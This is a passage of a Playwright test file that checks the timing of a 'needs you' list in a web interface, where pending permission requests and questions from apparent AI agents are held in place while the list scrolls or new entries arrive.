      await new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
      const armed = document.querySelector('#needs-you .needs-you-list').hasAttribute('data-arriving');
      document.querySelector(`#needs-you .needs-entry[data-id="${id}"] .needs-approve`).dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, detail: 1 }));
      return armed;
    }, second.id);
    expect(pushed).toBe(true);
    await page.waitForTimeout(100);
    expect((await log(page)).length).toBe(1);
  });
  test('an entry opened holds the lane while the list scrolls to its row, and a scroll after the wait holds nothing', async ({ page }) => {
    await openDemo(page);
    await ask(page, LAND, permission());
    await ask(page, CODEX, { id: 'q-lane-open', message: 'Which?', fields: [{ name: 'answer', type: 'choice', options: [{ value: 'a' }, { value: 'b' }] }] });
    // The page's clock the test's, so each step lands where the test puts it, however busy the runner.
    await page.clock.install();
    await page.clock.pauseAt(await page.evaluate(() => Date.now()) + 2000);
    const held = () => lane(page).locator('.needs-you-list').evaluate((l) => l.hasAttribute('data-arriving'));
    const step = () => page.evaluate(() => document.getElementById('list-pane').dispatchEvent(new Event('scroll')));
    // Opened from its entry: the list scrolls to its row, a step at a time over 600 ms.
    await entryFor(page, CODEX).locator('.needs-title').evaluate((t) => t.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, detail: 1 })));
    expect(await held()).toBe(true);
    for (let i = 0; i < 10; i += 1) {
      await page.clock.runFor(60);
      await step();
    }
    // 900 ms after the click, 300 after the last step: still held.
    await page.clock.runFor(300);
    expect(await held()).toBe(true);
    await page.clock.runFor(300);
    expect(await held()).toBe(false);
    // The person's own scroll, after: nothing held.
    await step();
    await page.clock.runFor(10);
    expect(await held()).toBe(false);
  });
});